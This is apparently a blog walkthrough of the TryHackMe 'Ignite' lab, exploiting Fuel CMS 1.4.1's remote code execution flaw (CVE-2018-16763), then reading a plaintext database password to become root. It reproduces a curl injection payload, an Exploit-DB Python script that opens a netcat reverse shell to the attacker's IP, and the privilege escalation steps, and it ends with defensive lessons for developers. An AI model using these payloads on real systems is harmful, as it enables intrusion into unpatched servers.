---
title: "Challenges: Ignite (TryHackMe)"
datePublished: Sat Jul 19 2025 19:31:47 GMT+0000 (Coordinated Universal Time)
cuid: cmdan9apn000302jy9rczbuzj
slug: challenges-ignite-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1752953250724/d270bd06-1dc6-431a-b2f7-965974bffa4c.png
tags: tryhackme, cve, rce, ctf-writeup, privilege-escalation, exploit-db

---

In this walkthrough, we’ll explore the *“Root It”* box on TryHackMe, a beginner-friendly but insightful machine created by DarkStar7471 and built by Paradox. The machine is based on a vulnerable version of **Fuel CMS (v1.4.1)**, which contains a known **Remote Code Execution (RCE)** vulnerability. The objective is to exploit the web application, gain initial foothold as a low-privileged user, and escalate privileges to obtain the root flag. Along the way, we’ll apply core enumeration, web exploitation, and privilege escalation techniques — making this a great learning resource for newcomers and developers transitioning into cybersecurity.

## Root it!

Root the box! Designed and created by [DarkStar7471](https://tryhackme.com/p/DarkStar7471), built by [Paradox](https://tryhackme.com/p/Paradox).

\----------------------------------------------------

*Enjoy the room! For future rooms and write-ups, follow* [*@darkstar7471*](https://twitter.com/darkstar7471) *on Twitter.*

### Answer the questions below

1. User.txt
    
    `nmap -sC -sV <IP_Address>`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752946498643/83851b74-5f2a-4c08-9319-fe8ac2ec5ca3.png align="center")
    
    * Port 80 open (Apache 2.4.18 on Ubuntu)
        
    * Fuel CMS found at `/fuel/` (from robots.txt)  
          
        Tried using `msfconsole`
        
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752946796751/9cdfe9e2-6be5-437e-8121-e8a90a27acf4.png align="center")
    
    `search fuel`  
      
    though this didn’t help much had to go back to other enumeration methods:
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752946931826/7fd3ea91-1932-44d9-a1fa-6d2c6159ab1c.png align="center")
    
    `curl “http://IP_Address/fuel/pages/select/?filter=%27);echo+system(‘id’);//“`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752947265981/2ac133d9-18de-4bd0-9e9a-dabd5228dc90.png align="center")
    
    visiting the site revealed the username and password together with the path `/fuel`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752947311453/4ebb84a0-5d05-4a74-a113-3910037c85f7.png align="center")
    
    since we know its FUEL CMS, we checked [exploitDB](https://www.exploit-db.com/exploits/47138) and downloaded the exploit  
    
    ```bash
      GNU nano 4.8                       fuelsql2.py                                  
    # Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1) Updated
    # Date 2021-08-16
    # Exploit Author: jtaubs1 (ice-wzl)
    # Vendor Homepage: https://www.getfuelcms.com/
    # Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
    # Version: <= 1.4.1
    # Tested on: Ubuntu - Apache2 - php5
    # CVE : CVE-2018-16763
    
    # Update included: Works with python3
        # Removed burp proxy code to allow it to run as a stand alone RCE exploit. 
        # Takes sys.args
        # Spawns a Reverse shell
    
    #!/usr/bin/python3
    import requests
    from urllib.parse import quote
    import sys
    
    
    url = sys.argv[1]
    ip = sys.argv[2]
    port = sys.argv[3]
    
    command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| nc " 
    command += ip 
    command += " "
    command += port
    command += ">/tmp/f"
    
    payload = (url + "/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24>
    r = requests.get(payload)
    print(r)
    
    
                      [ Read 34 lines (Converted from DOS format) ]
    ^G Get Help  ^O Write Out ^W Where Is  ^K Cut Text  ^J Justify   ^C Cur Pos
    ^X Exit      ^R Read File ^\ Replace   ^U Paste Text^T To Spell  ^_ Go To Line
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752949863900/f78a2692-5bf7-413b-baf3-f8714344078f.png align="center")
    
    `wget https://www.exploit-db.com/raw/47138 -O fuelsql2.py`  
      
    `nano fuelsql2.py`  
    
    * edit the Target IP, Attack IP, and the port
        
    * grant fuelsql2.py file execute permissions  
          
        `chmod +x fuelsql2.py`
        
    * run: `nc -lvnp 4444` on a different tab
        
    * on another tab run:
        
          
        `python3 fuel_sql.py http://Target_IP Attack_IP 4444`
        
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752947342724/fb403f20-27b2-4f1f-9c86-bfa976eabbc3.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752951179021/1625ee9d-1121-4611-92fc-e6e0fb4d14f7.png align="center")
    
    with this we get low initial access and we can find our user flag
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752947381877/28508244-944f-41cd-880d-32bc58bbbc62.png align="center")
    
    2. Root.txt  
        
        To find the root flag we’ll start by checking the files to find a way to escalate the privileges.  
          
        `cd /var/www/html`  
        
        `cat robots.txt`  
          
        `cat fuel/application/config/database.php`
        
        ```bash
        <?php
        defined('BASEPATH') OR exit('No direct script access allowed');
        
        /*
        | -------------------------------------------------------------------
        
        DATABASE CONNECTIVITY SETTINGS
        
        ---
        
        This file will contain the settings needed to access your database.
        
        ---
        
        ---
        
        For complete instructions please consult the 'Database Connection'
        
        ---
        
        page of the User Guide.
        
        ---
        
        ---
        
        - ------------------------------------------------------------------
        
        ---
        
        EXPLANATION OF VARIABLES
        
        ---
        
        - ------------------------------------------------------------------
        
        ---
        
        ---
        
        ['dsn']      The full DSN string describe a connection to the database.
        
        ---
        
        ['hostname'] The hostname of your database server.
        
        ---
        
        ['username'] The username used to connect to the database
        
        ---
        
        ['password'] The password used to connect to the database
        
        ---
        
        ['database'] The name of the database you want to connect to
        
        ---
        
        ['dbdriver'] The database driver. e.g.: mysqli.
        
        ---
        
        Currently supported:
        
        ---
        
        cubrid, ibase, mssql, mysql, mysqli, oci8,
        
        ---
        
        odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
        
        ---
        
        ['dbprefix'] You can add an optional prefix, which will be added
        
        ---
        
        to the table name when using the  Query Builder class
        
        ---
        
        ['pconnect'] TRUE/FALSE - Whether to use a persistent connection
        
        ---
        
        ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
        
        ---
        
        ['cache_on'] TRUE/FALSE - Enables/disables query caching
        
        ---
        
        ['cachedir'] The path to the folder where cache files should be stored
        
        ---
        
        ['char_set'] The character set used in communicating with the database
        
        ---
        
        ['dbcollat'] The character collation used in communicating with the database
        
        ---
        
        NOTE: For MySQL and MySQLi databases, this setting is only used
        
        ---
        
        as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
        
        ---
        
        (and in table creation queries made with DB Forge).
        
        ---
        
        There is an incompatibility in PHP with mysql_real_escape_string() which
        
        ---
        
        can make your site vulnerable to SQL injection if you are using a
        
        ---
        
        multi-byte character set and are running versions lower than these.
        
        ---
        
        Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
        
        ---
        
        ['swap_pre'] A default table prefix that should be swapped with the dbprefix
        
        ---
        
        ['encrypt']  Whether or not to use an encrypted connection.
        
        ---
        
        ---
        
        'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
        
        ---
        
        'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
        
        ---
        
        ---
        
        'ssl_key'    - Path to the private key file
        
        ---
        
        'ssl_cert'   - Path to the public key certificate file
        
        ---
        
        'ssl_ca'     - Path to the certificate authority file
        
        ---
        
        'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
        
        ---
        
        'ssl_cipher' - List of
        
        *allowed*
        
        ciphers to be used for the encryption, separated by colons (':')
        
        ---
        
        'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
        
        ---
        
        ---
        
        ['compress'] Whether or not to use client compression (MySQL only)
        
        ---
        
        ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
        
        ---
        
        - good for ensuring strict SQL while developing
        
        ---
        
        ['ssl_options']	Used to set various SSL options that can be used when making SSL connections.
        
        ---
        
        ['failover'] array - A array with 0 or more data for connections if the main should fail.
        
        ---
        
        ['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
        
        ---
        
        NOTE: Disabling this will also effectively disable both
        
        ---
        
        $this->db->last_query() and profiling of DB queries.
        
        ---
        
        When you run a query, with this setting set to TRUE (default),
        
        ---
        
        CodeIgniter will store the SQL statement for debugging purposes.
        
        ---
        
        However, this may cause high memory usage, especially if you run
        
        ---
        
        a lot of SQL queries ... disable this to avoid that problem.
        
        ---
        
        ---
        
        The $active_group variable lets you choose which connection group to
        
        ---
        
        make active.  By default there is only one group (the 'default' group).
        
        ---
        
        ---
        
        The $query_builder variables lets you determine whether or not to load
        
        ---
        
        the query builder class.
        
        ---
        
        - /
        
        ---
        
        $active_group = 'default';
        
        ---
        
        $query_builder = TRUE;
        
        ---
        
        $db['default'] = array(
        'dsn'	=> '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
        );
        
        // used for testing purposes
        if (defined('TESTING'))
        {
        @include(TESTER_PATH.'config/tester_database'.EXT);
        }
        ```
        
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752948156633/c8d34c8f-28e7-49f9-9097-231eef45e52c.png align="center")
    
    the php file reveals the username and password of the root
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752948196928/c9f103b2-9d9c-411f-8b39-4a0e1ca7747c.png align="center")
    
      
    $ `python -c 'import pty; pty.spawn("/bin/bash")'`  
    
    www-data@ubuntu:/var/www/html/fuel/application/config$ `su root`
    
    su root Password: mememe  
    
    root@ubuntu:/var/www/html/fuel/application/config# `find / -type f -name root.txt 2> /dev/null`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752948241781/cb504515-fae8-4817-a8ca-3cd8f1c61703.png align="center")
    

## 🔸 Lessons for Developers

This challenge isn't just for attackers — it's full of valuable takeaways for developers aiming to build more secure systems:

#### 1\. **Avoid Hardcoded Credentials**

* In the Fuel CMS config file, credentials were stored in plain text.
    
* **Best Practice:** Use environment variables or secrets management tools instead of embedding credentials in code or config files.
    

#### 2\. **Restrict Access to Sensitive Paths**

* The `/fuel` path was revealed in `robots.txt`, which is publicly accessible.
    
* **Best Practice:** Don’t rely on `robots.txt` for security. Implement proper authentication and authorization for sensitive admin areas.
    

#### 3\. **Keep Software Updated**

* Fuel CMS v1.4.1 has a known RCE vulnerability (CVE-2018-16763), which had been publicly disclosed.
    
* **Best Practice:** Regularly patch and update third-party dependencies. Subscribe to security mailing lists or use tools like Dependabot.
    

#### 4\. **Least Privilege Principle**

* The web server ran as `www-data`, which is good — but privilege escalation was possible because of weak system configurations.
    
* **Best Practice:** Isolate services and limit their privileges as much as possible, especially if they interact with user input.
    

#### 5\. **Input Validation Still Matters**

* The application was vulnerable to RCE via unvalidated user input.
    
* **Best Practice:** Sanitize and validate all user inputs. Assume that anything from a client can be malicious.
    

This machine is a great practical example of how outdated and misconfigured CMS platforms can lead to full system compromise. We began with basic enumeration using tools like `nmap`, found **Fuel CMS** via `/robots.txt`, and exploited a known **RCE vulnerability (CVE-2018-16763)** using a Python script from Exploit-DB to gain a reverse shell. With initial access as `www-data`, we discovered hardcoded credentials in a configuration file, which ultimately allowed us to switch to the `root` user and capture the final flag.

Key takeaways from this box:

* Always check **robots.txt** — it can reveal hidden paths.
    
* Known CVEs are powerful when versioning is visible.
    
* Misconfigured files and **hardcoded secrets** are critical for privilege escalation.
    
* Enumeration is everything: many exploits are hidden in plain sight.
    

For developers transitioning into security, this box reinforces the importance of thinking like an attacker and highlights why secure coding and hardening are essential in web app development.